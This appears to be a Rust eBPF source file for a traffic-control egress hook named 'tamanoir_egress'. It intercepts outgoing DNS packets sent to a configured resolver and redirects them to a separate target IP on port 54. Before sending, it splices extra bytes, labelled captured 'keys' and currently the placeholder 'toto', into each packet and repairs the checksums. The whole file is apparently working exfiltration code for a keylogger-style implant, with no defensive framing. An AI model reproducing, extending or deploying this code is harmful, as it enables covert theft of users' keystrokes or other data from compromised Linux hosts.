use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::{__sk_buff, TC_ACT_OK, TC_ACT_PIPE},
    cty::c_void,
    helpers::{
        bpf_csum_diff, bpf_csum_update, bpf_get_hash_recalc, bpf_set_hash_invalid,
        bpf_skb_store_bytes,
    },
    macros::classifier,
    programs::{sk_buff::SkBuff, TcContext},
};
use aya_log_ebpf::{error, info};
// use flex_dns::DnsMessage;
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    BPF_ADJ_ROOM_NET, BPF_F_MARK_ENFORCE, BPF_F_MARK_MANGLED_0, BPF_F_PSEUDO_HDR, DNS_QUERY_OFFSET,
    HIJACK_IP, IP_CSUM_OFFSET, IP_DEST_ADDR_OFFSET, IP_OFFSET, IP_TOT_LEN_OFFSET, TARGET_IP,
    UDP_CSUM_OFFSET, UDP_DEST_PORT_OFFSET, UDP_LEN_OFFSET, UDP_OFFSET,
};

// Maps

fn log_csums(ctx: &TcContext) {
    info!(
        ctx,
        "=> ipcsum: {}  udpcsum: {}",
        u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
        u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
    );
}

#[classifier]
pub fn tamanoir_egress(ctx: TcContext) -> i32 {
    match tc_process_egress(ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

fn update_dst_addr(ctx: &TcContext, skb: &SkBuff, old_be: &u32, new_be: &u32) {
    info!(ctx, "updating dst addr:");
    if unsafe {
        bpf_skb_store_bytes(
            skb.skb,
            IP_DEST_ADDR_OFFSET as u32,
            new_be as *const u32 as *const c_void,
            4,
            0,
        )
    } < 0
    {
        error!(ctx, "error writing new address ");
    }
    if let Err(err) = (*skb).l4_csum_replace(
        UDP_CSUM_OFFSET,
        *old_be as u64,
        *new_be as u64,
        4 + BPF_F_PSEUDO_HDR + BPF_F_MARK_ENFORCE,
    ) {
        error!(ctx, "error: {}", err);
    }

    if let Err(err) = (*skb).l3_csum_replace(IP_CSUM_OFFSET, *old_be as u64, *new_be as u64, 4) {
        error!(ctx, "error: {}", err);
    }
    log_csums(ctx);
}

fn update_dst_port(ctx: &TcContext, skb: &SkBuff, old_be: &u16, new_be: &u16) {
    info!(ctx, "updating dst port:");
    if unsafe {
        bpf_skb_store_bytes(
            skb.skb,
            UDP_DEST_PORT_OFFSET as u32,
            new_be as *const u16 as *const c_void,
            2,
            0,
        )
    } < 0
    {
        error!(ctx, "error writing new port ");
    }
    if let Err(err) = (*skb).l4_csum_replace(
        UDP_CSUM_OFFSET,
        *old_be as u64,
        *new_be as u64,
        2 + BPF_F_PSEUDO_HDR + BPF_F_MARK_ENFORCE,
    ) {
        error!(ctx, "error: {}", err);
    }

    log_csums(ctx);
}

fn update_udp_hdr_len(ctx: &TcContext, skb: &SkBuff, old_be: &u16, new_be: &u16) {
    info!(ctx, "updating udphdr len:");
    if unsafe {
        bpf_skb_store_bytes(
            skb.skb,
            UDP_LEN_OFFSET as u32,
            new_be as *const u16 as *const c_void,
            2,
            0,
        )
    } < 0
    {
        error!(ctx, "error writing new udp hdr len ");
    }
    if let Err(err) = (*skb).l4_csum_replace(
        UDP_CSUM_OFFSET,
        *old_be as u64,
        *new_be as u64,
        2 + BPF_F_PSEUDO_HDR + BPF_F_MARK_ENFORCE,
    ) {
        error!(ctx, "error: {}", err);
    }

    log_csums(ctx);
}

fn update_ip_hdr_tot_len(ctx: &TcContext, skb: &SkBuff, old_be: &u16, new_be: &u16) {
    info!(ctx, "updating iphdr tot len:");
    if unsafe {
        bpf_skb_store_bytes(
            skb.skb,
            IP_TOT_LEN_OFFSET as u32,
            new_be as *const u16 as *const c_void,
            2,
            0,
        )
    } < 0
    {
        error!(ctx, "error writing iphdr tot len ");
    }
    if let Err(err) = (*skb).l4_csum_replace(
        UDP_CSUM_OFFSET,
        *old_be as u64,
        *new_be as u64,
        2 + BPF_F_PSEUDO_HDR + BPF_F_MARK_ENFORCE,
    ) {
        error!(ctx, "error: {}", err);
    }
    if let Err(err) = (*skb).l3_csum_replace(IP_CSUM_OFFSET, *old_be as u64, *new_be as u64, 4) {
        error!(ctx, "error: {}", err);
    }
    log_csums(ctx);
}

fn inject_udp_payload(ctx: &TcContext, skb: &SkBuff, offset: u32, new_be: &u32) {
    info!(ctx, "injecting udp payload:");
    if unsafe { bpf_skb_store_bytes(skb.skb, offset, new_be as *const u32 as *const c_void, 4, 0) }
        < 0
    {
        error!(ctx, "error injecting payload ");
    }
    if let Err(err) = (*skb).l4_csum_replace(
        UDP_CSUM_OFFSET,
        0,
        *new_be as u64,
        4 + BPF_F_PSEUDO_HDR + BPF_F_MARK_ENFORCE,
    ) {
        error!(ctx, "error: {}", err);
    }

    log_csums(ctx);
}
fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };
    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let addr = header.dst_addr;
        if let IpProto::Udp = header.proto {
            if addr == hijack_ip {
                let dns_payload_len =
                    u16::from_be(ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?.len) - 8;
                info!(&ctx, "\n-----\nNew intercepted request:\n-----");
                info!(&ctx, "payload sz {}  ", dns_payload_len);

                let udp_hdr: UdpHdr = ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?;
                let dns_payload: [u8; 50] =
                    ctx.load::<[u8; 50]>(DNS_QUERY_OFFSET).map_err(|_| ())?;
                let skb = &ctx.skb;

                let fixed_size_added_keys: [u8; 4] =
                    "toto".as_bytes()[..4].try_into().map_err(|_| ())?;

                let keys_as_u32: u32 = ((fixed_size_added_keys[0] as u32) << 24)
                    | ((fixed_size_added_keys[1] as u32) << 16)
                    | ((fixed_size_added_keys[2] as u32) << 8)
                    | fixed_size_added_keys[3] as u32;

                let offset = fixed_size_added_keys.len();

                log_csums(&ctx);
                update_dst_addr(&ctx, skb, &addr, &target_ip.to_be());
                update_ip_hdr_tot_len(
                    &ctx,
                    skb,
                    &header.tot_len,
                    &(u16::from_be(header.tot_len) + offset as u16).to_be(),
                );

                // make room
                if let Err(err) = skb.adjust_room(offset as i32, BPF_ADJ_ROOM_NET, 0) {
                    error!(&ctx, "error adjusting room: {}", err);
                }

                // move udp header
                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        UDP_OFFSET as u32,
                        &udp_hdr as *const UdpHdr as *const c_void,
                        8,
                        0,
                    )
                } < 0
                {
                    error!(&ctx, "error shifting udp header ");
                }

                // move dns payload
                if unsafe {
                    bpf_skb_store_bytes(
                        skb.skb,
                        DNS_QUERY_OFFSET as u32,
                        &dns_payload as *const [u8; 50] as *const c_void,
                        50,
                        0,
                    )
                } < 0
                {
                    error!(&ctx, "error shifting dns payload ");
                }

                inject_udp_payload(
                    &ctx,
                    skb,
                    DNS_QUERY_OFFSET as u32 + 50,
                    &keys_as_u32.to_be(),
                );
                update_udp_hdr_len(
                    &ctx,
                    skb,
                    &udp_hdr.len,
                    &(u16::from_be(udp_hdr.len) + offset as u16).to_be(),
                );

                update_dst_port(&ctx, skb, &53u16.to_be(), &54u16.to_be());

                unsafe {
                    bpf_set_hash_invalid(skb.skb);
                    bpf_get_hash_recalc(skb.skb);
                }

                info!(
                    &ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(addr),
                    53,
                    Ipv4Addr::from_bits(u32::from_be(
                        (ctx.load::<Ipv4Hdr>(EthHdr::LEN).unwrap()).dst_addr,
                    )),
                    u16::from_be(ctx.load::<u16>(UDP_DEST_PORT_OFFSET).unwrap())
                );
            };
        }
    };

    Ok(TC_ACT_OK)
}
